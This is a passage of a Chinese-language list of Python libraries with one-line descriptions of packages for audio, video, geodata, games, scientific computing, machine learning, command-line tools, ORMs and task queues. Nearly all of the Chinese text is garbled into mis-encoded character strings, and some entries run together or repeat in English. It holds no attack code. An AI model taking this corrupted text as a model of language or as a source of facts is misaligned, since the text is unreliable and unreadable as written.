id3readerï¼Œç”¨äºè¯»å–MP3çš„å…ƒæ•°æ®ã€‚ mutagenï¼Œå¤„ç†éŸ³é¢‘å…ƒæ•°æ®ã€‚ pydubï¼Œ-æ“çºµéŸ³é¢‘å’Œç®€å•çš„é«˜å±‚æ¬¡çš„æ¥å£ã€‚ pyechonestï¼ŒEcho Nest APIå®¢æˆ·ç«¯ã€‚ talkboxï¼Œè¯­éŸ³å’Œä¿¡å·å¤„ç†çš„Pythonåº“ã€‚ TimeSideï¼Œå¼€æ”¾çš„ç½‘ç»œéŸ³é¢‘å¤„ç†æ¡†æ¶ã€‚ tinytagï¼Œè¯»å–éŸ³ä¹æ–‡ä»¶å…ƒæ•°æ®ï¼ŒåŒ…æ‹¬çš„MP3ï¼ŒOGGï¼ŒFLACå’Œwaveæ–‡ä»¶ã€‚ m3u8ï¼Œç”¨äºè§£æm3u8æ–‡ä»¶ã€‚ moviepyï¼Œå¤šæ ¼å¼è§†é¢‘ç¼–è¾‘è„šæœ¬æ¨¡å—ï¼ŒåŒ…æ‹¬GIFåŠ¨ç”»ã€‚ shorten.tvï¼Œè§†é¢‘æ‘˜è¦ã€‚scikitè§†é¢‘ï¼ŒSciPyè§†é¢‘å¤„ç†ä¾‹ç¨‹ã€‚ GeoDjango,ä¸€ä¸ªä¸–ç•Œçº§çš„åœ°ç†Webæ¡†æ¶ã€‚ geopy,Geoåœ°ç†ç¼–ç çš„å·¥å…·ç®±ã€‚ pygeoipï¼Œçº¯Pythonå†™çš„GeoIP APIã€‚ GeoIPï¼ŒPython APIæ¥å£ï¼Œä½¿ç”¨é«˜ç²¾åº¦GeoIP Legacy Databaseæ•°æ®åº“ã€‚ geojsonï¼ŒGeoJSONå‡½æ•°åº“django-countriesï¼Œä¸€ä¸ªDjangoç¨‹åºï¼Œæä¾›å›½å®¶é€‰æ‹©ï¼Œå›½æ——å›¾æ ‡çš„é™æ€æ–‡ä»¶ï¼Œå’Œä¸€ä¸ªå›½å®¶çš„åœ°åŸŸæ¨¡å‹ã€‚ Pygameï¼ŒPythonæ¸¸æˆè®¾è®¡æ¨¡å—ã€‚ Cocos2dï¼Œ2Dæ¸¸æˆæ¡†æ¶ï¼Œæ¼”ç¤ºï¼Œå’Œå…¶ä»–çš„å›¾å½¢/äº¤äº’åº”ç”¨ï¼ŒåŸºäºpygletã€‚Cocos2d- cocos2d is a framework for building 2D games, demos, and other graphical/interactive applications. It is based on pyglet.,PySDL2ï¼ŒSDL2çš„å°è£…åº“ã€‚ Panda3D- 3Dæ¸¸æˆå¼•æ“ï¼Œè¿ªå£«å°¼å¼€å‘ã€‚ç”¨C++å†™çš„ï¼Œå®Œå…¨å…¼å®¹Pythonã€‚ PyOgreï¼ŒOGRE 3Dæ¸²æŸ“å¼•æ“ï¼Œå¯ç”¨äºæ¸¸æˆï¼Œæ¨¡æ‹Ÿï¼Œä»»ä½•3Dã€‚ PyOpenGLï¼Œç»‘å®šOpenGLå’Œå®ƒç›¸å…³çš„APIã€‚ PySFMLï¼ŒPythonç»‘å®šSFMLRenPyï¼Œè§†è§‰å°è¯´å¼•æ“ã€‚ å¤§æ•°æ®ä¸ç§‘å­¦è®¡ç®— åº“åç§°ç®€ä»‹pycuda/openclï¼ŒGPUé«˜æ€§èƒ½å¹¶å‘è®¡ç®—Pandasï¼Œpythonå®ç°çš„ç±»ä¼¼Rè¯­è¨€çš„æ•°æ®ç»Ÿè®¡ã€åˆ†æå¹³å°ã€‚åŸºäºNumPyå’ŒMatplotlibå¼€å‘çš„ï¼Œä¸»è¦ç”¨äºæ•°æ®åˆ†æå’Œæ•°æ®å¯è§†åŒ–ï¼Œå®ƒçš„æ•°æ®ç»“æ„DataFrameå’ŒRè¯­è¨€é‡Œçš„data.frameå¾ˆåƒï¼Œç‰¹åˆ«æ˜¯å¯¹äºæ—¶é—´åºåˆ—æ•°æ®æœ‰è‡ªå·±çš„ä¸€å¥—åˆ†ææœºåˆ¶ï¼Œéå¸¸ä¸é”™ã€‚ Open Miningï¼Œå•†ä¸šæ™ºèƒ½ï¼ˆBIï¼‰ï¼ŒPandasçš„Webç•Œé¢ã€‚ blazeï¼ŒNumPyå’ŒPandaså¤§æ•°æ®ç•Œé¢ã€‚ SciPyï¼Œå¼€æºçš„Pythonç®—æ³•åº“å’Œæ•°å­¦å·¥å…·åŒ…ï¼ŒSciPyåŒ…å«çš„æ¨¡å—æœ‰æœ€ä¼˜åŒ–ã€çº¿æ€§ä»£æ•°ã€ç§¯åˆ†ã€æ’å€¼ã€ç‰¹æ®Šå‡½æ•°ã€å¿«é€Ÿå‚…é‡Œå¶å˜æ¢ã€ä¿¡å·å¤„ç†å’Œå›¾åƒå¤„ç†ã€å¸¸å¾®åˆ†æ–¹ç¨‹æ±‚è§£å’Œå…¶ä»–ç§‘å­¦ä¸å·¥ç¨‹ä¸­å¸¸ç”¨çš„è®¡ç®—ã€‚å…¶åŠŸèƒ½ä¸è½¯ä»¶MATLABã€Scilabå’ŒGNU Octaveç±»ä¼¼ã€‚Numpyå’ŒScipyå¸¸å¸¸ç»“åˆç€ä½¿ç”¨ï¼ŒPythonå¤§å¤šæ•°æœºå™¨å­¦ä¹ åº“éƒ½ä¾èµ–äºè¿™ä¸¤ä¸ªæ¨¡å—ã€‚ ScientificPythonï¼Œä¸€ç»„ç»è¿‡æŒ‘é€‰çš„Pythonç¨‹åºæ¨¡å—ï¼Œç”¨äºç§‘å­¦è®¡ç®—ï¼ŒåŒ…æ‹¬å‡ ä½•å­¦ï¼ˆçŸ¢é‡ã€å¼ é‡ã€å˜æ¢ã€çŸ¢é‡å’Œå¼ é‡åœºï¼‰ï¼Œå››å…ƒæ•°ï¼Œè‡ªåŠ¨æ±‚å¯¼æ•°ï¼Œï¼ˆçº¿æ€§ï¼‰æ’å€¼ï¼Œå¤šé¡¹å¼ï¼ŒåŸºç¡€ç»Ÿè®¡å­¦ï¼Œéçº¿æ€§æœ€å°äºŒä¹˜æ‹Ÿåˆï¼Œå•ä½è®¡ç®—ï¼ŒFortranå…¼å®¹çš„æ–‡æœ¬æ ¼å¼ï¼Œé€šè¿‡VRMLçš„3Dæ˜¾ç¤ºï¼Œä»¥åŠä¸¤ä¸ªTkå°å·¥å…·ï¼Œåˆ†åˆ«ç”¨äºç»˜åˆ¶çº¿å›¾å’Œ3Dç½‘æ ¼æ¨¡å‹ã€‚æ­¤å¤–è¿˜å…·æœ‰åˆ°netCDFï¼ŒMPIå’ŒBSPlibåº“çš„æ¥å£ã€‚ NumPyç§‘å­¦è®¡ç®—åº“ï¼Œæä¾›äº†çŸ©é˜µï¼Œçº¿æ€§ä»£æ•°ï¼Œå‚…ç«‹å¶å˜æ¢ç­‰ç­‰çš„è§£å†³æ–¹æ¡ˆ, æœ€å¸¸ç”¨çš„æ˜¯å®ƒçš„Nç»´æ•°ç»„å¯¹è±¡. NumPyæä¾›äº†ä¸¤ç§åŸºæœ¬çš„å¯¹è±¡ï¼šndarrayï¼ˆN-dimensional array objectï¼‰å’Œ ufuncï¼ˆuniversal function objectï¼‰ã€‚ndarrayæ˜¯å­˜å‚¨å•ä¸€æ•°æ®ç±»å‹çš„å¤šç»´æ•°ç»„ï¼Œè€Œufuncåˆ™æ˜¯èƒ½å¤Ÿå¯¹æ•°ç»„è¿›è¡Œå¤„ç†çš„å‡½æ•°ã€‚ Cvxoptï¼Œæœ€ä¼˜åŒ–è®¡ç®—åŒ…ï¼Œå¯è¿›è¡Œçº¿æ€§è§„åˆ’ã€äºŒæ¬¡è§„åˆ’ã€åŠæ­£å®šè§„åˆ’ç­‰çš„è®¡ç®—ã€‚ Numbaï¼Œç§‘å­¦è®¡ç®—é€Ÿåº¦ä¼˜åŒ–ç¼–è¯‘å™¨ã€‚ pymvpa2ï¼Œæ˜¯ä¸ºå¤§æ•°æ®é›†æä¾›ç»Ÿè®¡å­¦ä¹ åˆ†æçš„Pythonå·¥å…·åŒ…ï¼Œå®ƒæä¾›äº†ä¸€ä¸ªçµæ´»å¯æ‰©å±•çš„æ¡†æ¶ã€‚å®ƒæä¾›çš„åŠŸèƒ½æœ‰åˆ†ç±»ã€å›å½’ã€ç‰¹å¾é€‰æ‹©ã€æ•°æ®å¯¼å…¥å¯¼å‡ºã€å¯è§†åŒ–ç­‰ã€‚ NetworkXï¼Œå¤æ‚ç½‘ç»œçš„ä¼˜åŒ–è½¯ä»¶åŒ…ã€‚ ziplineï¼Œäº¤æ˜“ç®—æ³•çš„å‡½æ•°åº“ã€‚ PyDyï¼Œ PythonåŠ¨æ€å»ºæ¨¡å‡½æ•°åº“ã€‚ SymPy,ç¬¦å·æ•°å­¦çš„Pythonåº“ã€‚ statsmodels,Pythonçš„ç»Ÿè®¡å»ºæ¨¡å’Œè®¡é‡ç»æµå­¦ã€‚ astropy,å¤©æ–‡å­¦ç•Œçš„Pythonåº“ã€‚ orangeï¼Œæ©™è‰²ï¼Œæ•°æ®æŒ–æ˜ï¼Œæ•°æ®å¯è§†åŒ–ï¼Œé€šè¿‡å¯è§†åŒ–ç¼–ç¨‹æˆ–Pythonè„šæœ¬å­¦ä¹ æœºåˆ†æã€‚RDKit,åŒ–å­¦ä¿¡æ¯å­¦å’Œæœºå™¨å­¦ä¹ çš„è½¯ä»¶ã€‚ Open Babelï¼Œå·´è´å°”ï¼Œå¼€æ”¾çš„åŒ–å­¦å·¥å…·ç®±ã€‚ cclibï¼ŒåŒ–å­¦è½¯ä»¶åŒ…çš„è®¡ç®—å‡½æ•°åº“ã€‚ Biopythonï¼Œå…è´¹çš„ç”Ÿç‰©è®¡ç®—å·¥å…·åŒ…ã€‚ bccbï¼Œç”Ÿç‰©åˆ†æç›¸å…³çš„ä»£ç é›†ã€‚ bcbio-nextgenï¼Œæä¾›å®Œå…¨è‡ªåŠ¨åŒ–ã€é«˜é€šé‡ã€æµ‹åºåˆ†æçš„å·¥å…·åŒ…ã€‚ visvis, å¯è§†åŒ–è®¡ç®—æ¨¡å—åº“ï¼Œå¯è¿›è¡Œä¸€ç»´åˆ°å››ç»´æ•°æ®çš„å¯è§†åŒ–ã€‚ MapReduceæ˜¯Googleæå‡ºçš„ä¸€ä¸ªè½¯ä»¶[æ¶æ„]ï¼Œç”¨äºå¤§è§„æ¨¡æ•°æ®é›†ï¼ˆå¤§äº1TBï¼‰çš„å¹¶è¡Œè¿ç®—ã€‚æ¦‚å¿µâ€œMapï¼ˆæ˜ å°„ï¼‰â€å’Œâ€œReduceï¼ˆå½’çº³ï¼‰â€ï¼ŒåŠä»–ä»¬çš„ä¸»è¦æ€æƒ³ï¼Œéƒ½æ˜¯ä»å‡½æ•°å¼ç¼–ç¨‹è¯­è¨€å€Ÿæ¥çš„MapReduceå‡½æ•°åº“ã€‚ Framworks and libraries for MapReduce.,PySparkï¼Œ[Spark]çš„Python APIã€‚dparkï¼ŒSparkçš„Pythonå…‹éš†ï¼ŒPythonä¸­çš„MapReduceæ¡†æ¶ã€‚ luigiï¼Œä¸ºæ‰¹é‡å·¥ä½œï¼Œå»ºç«‹å¤æ‚çš„ç®¡é“ã€‚ mrjobï¼Œè¿è¡Œåœ¨[Hadoop]ï¼Œæˆ–äºšé©¬é€Šç½‘ç»œæœåŠ¡çš„ï¼ŒMapReduceå·¥ä½œã€‚ äººå·¥æ™ºèƒ½ä¸æœºå™¨å­¦ä¹  åº“åç§°ç®€ä»‹NLTKï¼ˆnatural language toolkit)ï¼Œæ˜¯pythonçš„è‡ªç„¶è¯­è¨€å¤„ç†å·¥å…·åŒ…ã€‚2001å¹´æ¨å‡ºï¼ŒåŒ…æ‹¬äº†å¤§é‡çš„è¯æ–™åº“ï¼Œä»¥åŠè‡ªç„¶è¯­è¨€å¤„ç†æ–¹é¢çš„ç®—æ³•å®ç°ï¼šåˆ†è¯ï¼Œ è¯æ ¹è®¡ç®—ï¼Œ åˆ†ç±»ï¼Œ è¯­ä¹‰åˆ†æç­‰ã€‚ Patternï¼Œæ•°æ®æŒ–æ˜æ¨¡å—ï¼ŒåŒ…æ‹¬è‡ªç„¶è¯­è¨€å¤„ç†ï¼Œæœºå™¨å­¦ä¹ å·¥å…·ï¼Œç­‰ç­‰ã€‚ textblobï¼Œæä¾›APIä¸ºè‡ªç„¶è¯­è¨€å¤„ç†ã€åˆ†è§£NLPä»»åŠ¡ã€‚åŸºäºNLTKå’ŒPatternæ¨¡å—ã€‚ jiebaï¼Œç»“å·´ï¼Œä¸­æ–‡åˆ†è¯å·¥å…·ã€‚ snownlpï¼Œç”¨äºå¤„ç†ä¸­æ–‡æ–‡æœ¬åº“ã€‚ losoï¼Œä¸­æ–‡åˆ†è¯å‡½æ•°åº“ã€‚ geniusï¼Œä¸­æ–‡CRFåŸºç¡€åº“ï¼Œæ¡ä»¶éšæœºåœº(conditional random field,ç®€ç§° CRF),æ˜¯ä¸€ç§é‰´åˆ«å¼æœºç‡æ¨¡å‹,æ˜¯éšæœºåœºçš„ä¸€ç§,å¸¸ç”¨äºæ ‡æ³¨æˆ–åˆ†æåºåˆ—èµ„æ–™,å¦‚è‡ªç„¶è¯­è¨€æ–‡å­—æˆ–æ˜¯ç”Ÿç‰©åºåˆ—ã€‚ Gensimï¼Œä¸€ä¸ªç›¸å½“ä¸“ä¸šçš„ä¸»é¢˜æ¨¡å‹Pythonå·¥å…·åŒ…ï¼Œæ— è®ºæ˜¯ä»£ç è¿˜æ˜¯æ–‡æ¡£ï¼Œå¯ç”¨äºå¦‚ä½•è®¡ç®—ä¸¤ä¸ªæ–‡æ¡£çš„ç›¸ä¼¼åº¦LIBSVM,æ˜¯å°æ¹¾å¤§å­¦æ—æ™ºä»(Lin Chih-Jen)æ•™æˆç­‰å¼€å‘è®¾è®¡çš„ä¸€ä¸ªç®€å•ã€æ˜“äºä½¿ç”¨å’Œå¿«é€Ÿæœ‰æ•ˆçš„SVMæ¨¡å¼è¯†åˆ«ä¸å›å½’çš„è½¯ä»¶åŒ…ï¼Œä»–ä¸ä½†æä¾›äº†ç¼–è¯‘å¥½çš„å¯åœ¨Windowsç³»åˆ—ç³»ç»Ÿçš„æ‰§è¡Œæ–‡ä»¶ï¼Œè¿˜æä¾›äº†æºä»£ç ï¼Œæ–¹ä¾¿æ”¹è¿›ã€ä¿®æ”¹ä»¥åŠåœ¨å…¶å®ƒ[æ“ä½œç³»ç»Ÿ]ä¸Šåº”ç”¨ï¼›è¯¥è½¯ä»¶å¯¹SVMæ‰€æ¶‰åŠçš„å‚æ•°è°ƒèŠ‚ç›¸å¯¹æ¯”è¾ƒå°‘ï¼Œæä¾›äº†å¾ˆå¤šçš„é»˜è®¤å‚æ•°ï¼Œåˆ©ç”¨è¿™äº›é»˜è®¤å‚æ•°å¯ä»¥è§£å†³å¾ˆå¤šé—®é¢˜ï¼›å¹¶æä¾›äº†äº¤äº’æ£€éªŒ(Cross Validation)çš„åŠŸèƒ½ã€‚è¯¥è½¯ä»¶å¯ä»¥è§£å†³C-SVMã€Î½-SVMã€Îµ-SVRå’ŒÎ½-SVRç­‰é—®é¢˜ï¼ŒåŒ…æ‹¬åŸºäºä¸€å¯¹ä¸€ç®—æ³•çš„å¤šç±»æ¨¡å¼è¯†åˆ«é—®é¢˜ã€‚ scikits.learnï¼Œæ„å»ºåœ¨SciPyä¹‹ä¸Šç”¨äºæœºå™¨å­¦ä¹ çš„ Python æ¨¡å—ã€‚å®ƒåŒ…æ‹¬ç®€å•è€Œé«˜æ•ˆçš„å·¥å…·ï¼Œå¯ç”¨äºæ•°æ®æŒ–æ˜å’Œæ•°æ®åˆ†æã€‚æ¶µç›–åˆ†ç±»ï¼Œå›å½’å’Œèšç±»ç®—æ³•ï¼Œä¾‹å¦‚SVMï¼Œ é€»è¾‘å›å½’ï¼Œæœ´ç´ è´å¶æ–¯ï¼Œéšæœºæ£®æ—ï¼Œk-meansç­‰ç®—æ³•ï¼Œä»£ç å’Œæ–‡æ¡£éƒ½éå¸¸ä¸é”™ï¼Œåœ¨è®¸å¤šPythoné¡¹ç›®ä¸­éƒ½æœ‰åº”ç”¨ã€‚ä¾‹å¦‚åœ¨æˆ‘ä»¬ç†Ÿæ‚‰çš„NLTKä¸­ï¼Œåˆ†ç±»å™¨æ–¹é¢å°±æœ‰ä¸“é—¨é’ˆå¯¹scikit-learnçš„æ¥å£ï¼Œå¯ä»¥è°ƒç”¨scikit-learnçš„åˆ†ç±»ç®—æ³•ä»¥åŠè®­ç»ƒæ•°æ®æ¥è®­ç»ƒåˆ†ç±»å™¨æ¨¡å‹ã€‚ PyMCï¼Œæœºå™¨å­¦ä¹ é‡‡æ ·å·¥å…·åŒ…ï¼Œscikit-learnä¼¼ä¹æ˜¯æ‰€æœ‰äººçš„å® å„¿ï¼Œæœ‰äººè®¤ä¸ºï¼ŒPyMCæ›´æœ‰é­…åŠ›ã€‚PyMCä¸»è¦ç”¨æ¥åšBayesianåˆ†æã€‚ Orangeï¼ŒåŸºäºç»„ä»¶çš„æ•°æ®æŒ–æ˜å’Œæœºå™¨å­¦ä¹ è½¯ä»¶å¥—è£…ï¼Œå®ƒçš„åŠŸèƒ½å³å‹å¥½ï¼Œåˆå¾ˆå¼ºå¤§ï¼Œå¿«é€Ÿè€Œåˆå¤šåŠŸèƒ½çš„å¯è§†åŒ–ç¼–ç¨‹å‰ç«¯ï¼Œä»¥ä¾¿æµè§ˆæ•°æ®åˆ†æå’Œå¯è§†åŒ–ï¼ŒåŒ…å«äº†å®Œæ•´çš„ä¸€ç³»åˆ—çš„ç»„ä»¶ä»¥è¿›è¡Œæ•°æ®é¢„å¤„ç†ï¼Œå¹¶æä¾›äº†æ•°æ®å¸ç›®ï¼Œè¿‡æ¸¡ï¼Œå»ºæ¨¡ï¼Œæ¨¡å¼è¯„ä¼°å’Œå‹˜æ¢çš„åŠŸèƒ½ã€‚ä¾§é‡æ•°æ®æŒ–æ˜ï¼Œå¯ä»¥ç”¨å¯è§†åŒ–è¯­è¨€æˆ–Pythonè¿›è¡Œæ“ä½œï¼Œæ‹¥æœ‰æœºå™¨å­¦ä¹ ç»„ä»¶ï¼Œè¿˜å…·æœ‰ç”Ÿç‰©ä¿¡æ¯å­¦ä»¥åŠæ–‡æœ¬æŒ–æ˜çš„æ’ä»¶ã€‚ Milkï¼Œæœºå™¨å­¦ä¹ å·¥å…·ç®±ï¼Œå…¶é‡ç‚¹æ˜¯æä¾›ç›‘ç£åˆ†ç±»æ³•ä¸å‡ ç§æœ‰æ•ˆçš„åˆ†ç±»åˆ†æï¼šSVMs(åŸºäºlibsvm)ï¼ŒK-NNï¼Œéšæœºæ£®æ—ç»æµå’Œå†³ç­–æ ‘ã€‚å®ƒè¿˜å¯ä»¥è¿›è¡Œç‰¹å¾é€‰æ‹©ã€‚è¿™äº›åˆ†ç±»å¯ä»¥åœ¨è®¸å¤šæ–¹é¢ç›¸ç»“åˆï¼Œå½¢æˆä¸åŒçš„åˆ†ç±»ç³»ç»Ÿã€‚å¯¹äºæ— ç›‘ç£å­¦ä¹ ï¼Œå®ƒæä¾›K-meanså’Œaffinity propagationèšç±»ç®—æ³•ã€‚ PyMVPA(Multivariate Pattern Analysis in Python),æ˜¯ä¸ºå¤§æ•°æ®é›†æä¾›ç»Ÿè®¡å­¦ä¹ åˆ†æçš„Pythonå·¥å…·åŒ…ï¼Œå®ƒæä¾›äº†ä¸€ä¸ªçµæ´»å¯æ‰©å±•çš„æ¡†æ¶ã€‚å®ƒæä¾›çš„åŠŸèƒ½æœ‰åˆ†ç±»ã€å›å½’ã€ç‰¹å¾é€‰æ‹©ã€æ•°æ®å¯¼å…¥å¯¼å‡ºã€å¯è§†åŒ–ç­‰ã€‚ NuPICï¼Œå¼€æºäººå·¥æ™ºèƒ½å¹³å°ã€‚è¯¥é¡¹ç›®ç”±Grokï¼ˆåŸå Numentaï¼‰å…¬å¸å¼€å‘ï¼Œå…¶ä¸­åŒ…æ‹¬äº†å…¬å¸çš„ç®—æ³•å’Œè½¯ä»¶æ¶æ„ã€‚NuPIC çš„è¿ä½œæ¥è¿‘äºäººè„‘ï¼Œâ€œå½“æ¨¡å¼å˜åŒ–çš„æ—¶å€™ï¼Œå®ƒä¼šå¿˜æ‰æ—§æ¨¡å¼ï¼Œè®°å¿†æ–°æ¨¡å¼â€ã€‚å¦‚äººè„‘ä¸€æ ·ï¼ŒCLA ç®—æ³•èƒ½å¤Ÿé€‚åº”æ–°çš„å˜åŒ–ã€‚ Pylearn2ï¼Œ-åŸºäºTheanoçš„æœºå™¨å­¦ä¹ åº“ã€‚ hebelï¼ŒGPUåŠ é€Ÿï¼Œ[æ·±åº¦å­¦ä¹ ]Pythonåº“ã€‚ gensimï¼Œæœºå™¨å­¦ä¹ åº“ã€‚ pybrainï¼Œæœºå™¨å­¦ä¹ æ¨¡å—ï¼Œå®ƒçš„ç›®æ ‡æ˜¯ä¸ºæœºå™¨å­¦ä¹ ä»»åŠ¡æä¾›çµæ´»ã€æ˜“åº”ã€å¼ºå¤§çš„æœºå™¨å­¦ä¹ ç®—æ³•ã€‚pybrainåŒ…æ‹¬ç¥ç»ç½‘ç»œã€å¼ºåŒ–å­¦ä¹ (åŠäºŒè€…ç»“åˆ)ã€æ— ç›‘ç£å­¦ä¹ ã€è¿›åŒ–ç®—æ³•ã€‚ä»¥ç¥ç»ç½‘ç»œä¸ºæ ¸å¿ƒï¼Œæ‰€æœ‰çš„è®­ç»ƒæ–¹æ³•éƒ½ä»¥ç¥ç»ç½‘ç»œä¸ºä¸€ä¸ªå®ä¾‹Mahout,æ˜¯ Apache Software Foundationï¼ˆASFï¼‰ æ——ä¸‹çš„ä¸€ä¸ªå¼€æºé¡¹ç›®ï¼Œæä¾›ä¸€äº›å¯æ‰©å±•çš„æœºå™¨å­¦ä¹ é¢†åŸŸç»å…¸ç®—æ³•çš„å®ç°ï¼Œæ—¨åœ¨å¸®åŠ©å¼€å‘äººå‘˜æ›´åŠ æ–¹ä¾¿å¿«æ·åœ°åˆ›å»ºæ™ºèƒ½åº”ç”¨ç¨‹åºã€‚MahoutåŒ…å«è®¸å¤šå®ç°ï¼ŒåŒ…æ‹¬èšç±»ã€åˆ†ç±»ã€æ¨èè¿‡æ»¤ã€é¢‘ç¹å­é¡¹æŒ–æ˜ã€‚æ­¤å¤–ï¼Œé€šè¿‡ä½¿ç”¨ Apache Hadoop åº“ï¼ŒMahout å¯ä»¥æœ‰æ•ˆåœ°æ‰©å±•åˆ°äº‘ä¸­ã€‚ Crabï¼Œçµæ´»çš„ï¼Œå¿«é€Ÿçš„æ¨èå¼•æ“ã€‚ python-recsysï¼Œå¨±ä¹ç³»ç»Ÿåˆ†æï¼Œæ¨èç³»ç»Ÿã€‚ vowpal_porpoiseï¼ŒVowpal Wabbitè½»é‡çº§Pythonå°è£…ã€‚ Theano,ç”¨æ¥å®šä¹‰ã€ä¼˜åŒ–å’Œæ¨¡æ‹Ÿæ•°å­¦è¡¨è¾¾å¼è®¡ç®—ï¼Œç”¨äºé«˜æ•ˆçš„è§£å†³å¤šç»´æ•°ç»„çš„è®¡ç®—é—®é¢˜çš„pythonè½¯ä»¶åŒ…ã€‚å®ƒä½¿å¾—å†™æ·±åº¦å­¦ä¹ æ¨¡å‹æ›´åŠ å®¹æ˜“ï¼ŒåŒæ—¶ä¹Ÿç»™å‡ºäº†ä¸€äº›å…³äºåœ¨GPUä¸Šè®­ç»ƒå®ƒä»¬çš„é€‰é¡¹ã€‚ ç³»ç»Ÿä¸å‘½ä»¤è¡Œ åº“åç§°ç®€ä»‹threadingï¼ŒPythonæ ‡å‡†çº¿ç¨‹åº“ï¼Œæ›´é«˜çº§åˆ«çš„çº¿ç¨‹æ¥å£ã€‚ envoyï¼Œç‰¹ä½¿ï¼ŒPythonå­çº¿ç¨‹çš„å‡½æ•°åº“ã€‚ shï¼Œæˆç†Ÿçš„å­çº¿ç¨‹æ›¿æ¢å‡½æ•°åº“ã€‚ sargeï¼Œå°è£…çº¿ç¨‹ã€‚ subprocess,è°ƒç”¨shellå‘½ä»¤çš„ç¥å™¨argparseï¼Œå†™å‘½ä»¤è¡Œè„šæœ¬å¿…å¤‡ï¼Œå¼ºå¤§çš„å‘½ä»¤è¡Œå·®æ•°è§£æå·¥å…·timeitï¼Œè®¡ç®—ä»£ç è¿è¡Œçš„æ—¶é—´ç­‰ç­‰unpï¼Œå‘½ä»¤è¡Œå·¥å…·ï¼Œè§£å‹æ–‡ä»¶ã€‚ eventletå¼€é”€å¾ˆå°‘çš„å¤šçº¿ç¨‹æ¨¡å—ï¼Œä½¿ç”¨çš„æ˜¯ green threads æ¦‚å¿µï¼Œä¾‹å¦‚ï¼Œpool = eventlet.GreenPool(10000) è¿™æ ·ä¸€æ¡è¯­å¥ä¾¿åˆ›å»ºäº†ä¸€ä¸ªå¯ä»¥å¤„ç† 10000 ä¸ªå®¢æˆ·ç«¯è¿æ¥çš„çº¿ç¨‹æ± ã€‚ç±»ä¼¼Geventçº¿ç¨‹åº“Geventï¼Œå¤šçº¿ç¨‹æ¨¡å—pytools,è‘—åçš„pythoné€šç”¨å‡½æ•°ã€å·¥å…·åŒ…SendKeys, é”®ç›˜é¼ æ ‡æ“ä½œæ¨¡å—, æ¨¡æ‹Ÿé”®ç›˜é¼ æ ‡æ¨¡æ‹Ÿæ“ä½œã€‚ pyHook,åŸºäºPythonçš„â€œé’©å­â€åº“ï¼Œä¸»è¦ç”¨äºç›‘å¬å½“å‰ç”µè„‘ä¸Šé¼ æ ‡å’Œé”®ç›˜çš„äº‹ä»¶ã€‚è¿™ä¸ªåº“ä¾èµ–äºå¦ä¸€ä¸ªPythonåº“PyWin32ï¼Œå¦‚åŒåå­—æ‰€æ˜¾ç¤ºçš„ï¼ŒPyWin32åªèƒ½è¿è¡Œåœ¨Windowså¹³å°ï¼Œæ‰€ä»¥PyHookä¹Ÿåªèƒ½è¿è¡Œåœ¨Windowså¹³å°ã€‚ pstuil,è·¨å¹³å°åœ°å¾ˆæ–¹ä¾¿è·å–å’Œæ§åˆ¶ç³»ç»Ÿçš„è¿›ç¨‹ï¼Œä»¥åŠè¯»å–ç³»ç»Ÿçš„CPUå ç”¨å†…å­˜å ç”¨ç­‰ä¿¡æ¯. cementï¼Œä¸€ä¸ªè½»é‡çº§çš„ã€åŠŸèƒ½é½å…¨çš„å‘½ä»¤è¡Œå·¥å…· clickï¼Œç®€å•ä¼˜é›…çš„çš„å‘½ä»¤è¡Œæ¥å£ã€‚ clintï¼ŒPythonå‘½ä»¤è¡Œå·¥å…·ã€‚ cliffï¼Œåˆ›é€ å¤šå±‚æ¬¡æŒ‡ä»¤çš„å‘½ä»¤è¡Œç¨‹åºæ¡†æ¶ã€‚ Climeï¼Œ å¯ä»¥è½¬æ¢ä»»ä½•æ¨¡å—ä¸ºå¤šçš„CLIå‘½ä»¤ç¨‹åºï¼Œæ— ä»»ä½•é…ç½®ã€‚ docoptï¼ŒPythonå‘½ä»¤è¡Œå‚æ•°åˆ†æå™¨ã€‚ pycliï¼Œå‘½ä»¤è¡Œåº”ç”¨ç¨‹åºï¼Œæ”¯æŒçš„æ ‡å‡†å‘½ä»¤è¡Œè§£æï¼Œæµ‹äº•ï¼Œå•å…ƒ[æµ‹è¯•]å’ŒåŠŸèƒ½æµ‹è¯•ã€‚ Gooeyï¼Œæ‰“å¼€å‘½ä»¤è¡Œç¨‹åºï¼Œä½œä¸ºä¸ºä¸€ä¸ªå®Œæ•´çš„GUIåº”ç”¨ç¨‹åº,cookiecutterï¼Œå‘½ä»¤è¡Œå·¥å…·ï¼Œä»cookiecuttersï¼ˆé¡¹ç›®æ¨¡æ¿ï¼‰åˆ›å»ºé¡¹ç›®ã€‚ä¾‹å¦‚ï¼ŒPythonåŒ…é¡¹ç›®ï¼ŒjQueryæ’ä»¶é¡¹ç›®ã€‚percolï¼Œä¸ºUNIXä¼ ç»Ÿç®¡é“pipeå‘½ä»¤ï¼Œæ·»åŠ äº¤äº’å¼é€‰æ‹©é£æ ¼ã€‚ rainbowstreamï¼Œèªæ˜å’Œæ¼‚äº®çš„æ¨ç‰¹å®¢æˆ·ç»ˆç«¯ã€‚ Django Modelsï¼ŒDjangoçš„ä¸€éƒ¨åˆ†SQLAlchemyï¼ŒPython SQLå·¥å…·åŒ…å’Œå¯¹è±¡å…³ç³»æ˜ å°„ã€‚ peeweeï¼Œå°å‹çš„ORMè§£æå™¨ã€‚ PonyORMï¼Œä¸ºORMæä¾›äº†ä¸€ç§é¢å‘SQLçš„æ¥å£ã€‚ MongoEngineï¼ŒPythonå¯¹è±¡æ–‡ä»¶æ˜ å°„ï¼Œä½¿ç”¨[MongoDB]ã€‚, Django MongoDBå¼•æ“MongoDB , Djangoåå°ã€‚ django-mongodb-engineï¼ŒDjangoåå°.redisco,ä¸€ä¸ªç®€å•çš„æ¨¡å‹å’Œå®¹å™¨åº“ï¼Œä½¿ç”¨[Redis]flywheelï¼ŒAmazon DynamoDBå¯¹è±¡æ˜ å°„ã€‚ butterdbï¼Œè°·æ­Œç”µå­è¡¨æ ¼çš„ORMï¼ŒPythonç‰ˆã€‚ celeryï¼ŒèŠ¹èœï¼Œå¼‚æ­¥ä»»åŠ¡é˜Ÿåˆ—/å·¥ä½œï¼ŒåŸºäºåˆ†å¸ƒå¼æ¶ˆæ¯é˜Ÿåˆ—ã€‚ hueyï¼Œä¼‘ä¼Šï¼Œè½»é‡çº§ï¼Œå¤šçº¿ç¨‹ä»»åŠ¡é˜Ÿåˆ—ã€‚ mrqï¼Œé˜Ÿåˆ—å…ˆç”Ÿï¼Œåˆ†å¸ƒå¼ä»»åŠ¡é˜Ÿåˆ—ï¼Œä½¿ç”¨redis &amp; Geventã€‚ 